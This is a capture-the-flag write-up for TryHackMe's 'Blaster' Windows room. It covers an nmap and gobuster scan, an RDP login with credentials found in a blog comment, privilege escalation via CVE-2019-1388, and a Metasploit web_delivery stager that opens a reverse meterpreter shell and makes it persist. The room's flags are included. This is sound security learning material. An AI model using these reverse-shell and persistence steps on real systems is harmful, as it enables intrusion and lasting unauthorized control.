# Target: Blaster
**Platform:** TryHackMe
[Blaster on TryHackMe](https://tryhackme.com/room/blaster)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Blaster | 10.113.148.62 | Windows | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by running the `nmap` scan on this machine. I had to add the `-Pn` flag, because firewall on this machine was locking ping requests, this flag skips the host discovery phase and forces the scan. The `-sV` flag was used to show version of services running on each port adn the `-vv` flag was used to increase verbosity.
**Nmap Scan:**
```bash
nmap -Pn -sV -vv 10.113.148.62
```

```
Scanned at 2026-03-23 12:36:34 CET for 18s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Seeing that port 80 was open, I immedietally opened web browser and navigated to the IP Addres. The langing page was deafult Windows Server page with caption: `Internet Information Services` and some tiles showing: `Welcome` in different languages. This server name was `ISS Windows Server`.
Since ther was nothing else I decided to execute dirbuster attack to find hidden directories located on this server. I used `gobuster` tool with `-dir` flag, which allows me to execute directories finding.
**Directory Brute-forcing:**
```bash
gobuster dir --url http://10.113.148.62/ --wordlist /usr/share/dirbuster/wordlists/directories.jbrofuzz
```

```
# Maximum number of lines               50000 (Status: 400) [Size: 324]
# Maximum line length                   256 (Status: 400) [Size: 324]
.                    (Status: 200) [Size: 703]
\                    (Status: 200) [Size: 703]
retro                (Status: 301) [Size: 150] [--> http://10.113.148.62/retro/]
Retro                (Status: 301) [Size: 150] [--> http://10.113.148.62/Retro/]
Progress: 58686 / 58686 (100.00%)
```

Seeing this hidden directories, I immedietally opened them URL's in the browser and them showed the same page: `Retro Fantastic`. I made some research on this page to find any potential data. The owner of this blog page: `Wade` could be username for logging to it's machine. After going throught the posts I decided to read comment below them and under one post I saw the comment with potetntial password: `parzival`

## Phase 2: Initial Foothold (Gaining Access)

Having this data I tried to login to this machine using RDP (Remote Desktop Protocol).
**Login to Machine as Wade:**
```bash
rdesktop -u Wade 10.113.148.62
```

After a while remote desktop window appears and there was normal login page to the Windows. I used potential password and I've succesfully logged in. On the desktop I found file: `user.txt`. I clicked it to open it and I've got a flag: `THM{HACK_PLAYER_ONE}`.

Next I moved to looking for CVE on this machine, which could ecsalate my privileges to administrator. Besides the text file and Recycle Bin on the desktop, there was an `.exe` file named: `hhupd`. I opened browser on my Kali Linux and searched for the phrase: `hhupd Privilege Escalation CVE`. I found the article about it, where the whole vulnerability was described and there was a CVE.
**Vulnerability Identified:** [CVE-2019-1388]

## Phase 3: Privilege Escalation & Post-Exploitation

I followed the path of this CVE and succesfully escalated my privilages. 
**Proof of Admin:**
```shell
whoami
```

```
nt authority\system
```

Next I navigaed through the system in cmd usign `cd` and `dir` commands. When I found the file `root.txt` on Administrator's desktop, which contains the flag I read it using `type` command and this showed me the flag: `THM{COIN_OPERATED_EXPLOITATION}`.

##Phase 4: Exploitation Using Metasploit

I moved back to my Kali Linux machine and launched metasploit console by using command: `msfconsole`. After a while the script had loaded successfully and I moved to picking the correct exploit.
**Using Specified Exploit:**
```bash
use exploit/multi/script/web_delivery
```

After a while the exploit loaded. Next I found the target id by using command: `show targets`.
```
Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X
```

I set target to 2 (PSH - PowerShell) - `set target 2`.
Next I check for the payload which I was preparing to chech what I had to set. I checked it by using: `show options`.
```
Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH
```

I had to set LHOST, so I set it up to my VPN Ip Address - `set LHOST 192.168.158.248`. I don't set LPORT, because I wanted to set it on 4444, but it was already set.
Next I had to set one more exploit to end configurating this payload - `set payload windows/meterpreter/reverse_http`.
After configuring the payload I run it by using command `exploit`. Program showed me a very long command which was starting by `powershell`, I coppied it and pasted to the Administrator's cmd terminal in the target machine. After a while I've got the message that session had opened, but this session was in the background so I have to moved to it.
I switched to the seesnio - `sessions -i 1`. I saw the prompt changed to `meterpreter>` so I knew that I'd connected. 
The last thing to set was setting this exploit to start at everty time when system started. I did it using this command `run persistence -X` but in the newer version of meterpreter this command should look like this `run exploit/windows/local/persistence -X`.


## Conclusion & Takeaways

**Summary:** Compromising the Blaster machine involved connecting to `Remote Desktop` by using `rdesktop`. The username and password were found in plain text in a comment on a blog hosted on the target web server. Because the developer left this sensitive data in a visible place, it was easy to gain initial access. Next, I've checked that this machine was vulnerable to `CVE-2019-1388` exploit, which allowed me to spawn admin shell. At the end, by using metasploit, I maintain remote connection to admin shell and set it to run on system start.

**What I Learned:** To look throught whole site on port 80, because it could contains login data. How to set up Metasploit exploit to get remote connection to admin shell. How to set up this exploit to run on system start.

**Remediation:** 
To secure this machine and prevent similar attacks, I recommend the following remediations:

1. **Delete Login data from Blog:** The developer of this machine left password to his account in the comment below post. I't obvoius, that world `parzival` could be tha password, because he wrote it to don't forhet it, so that mean that this is important. This comment must be removed from the site and the password to this username must be changed, because a lot of people could see it.

2. **Deletin Vulnerable File:** File `hhupd.exe` was vulnerable to spawn admin shell, when being a basic level user. That is critical security breach. Admin of this system shoudl be obligated to delete this file and update system to the newest version.

**What I could do beeter/faster in the future:**
After completing this machine, I'd learned some skill that will improve my future study and work:

1. **Vulnerabilities Usage:** After knowing that system is vulnerable to `CVE-2019=1388` I will use this exploit immediatelly, by using description on the site.

2. **Metasploit Usage:** Metasploit is very usefull tool. Now I feel better in using it. So in the future attacks it will be easier to me, to use it, prepere exploits and execute it.
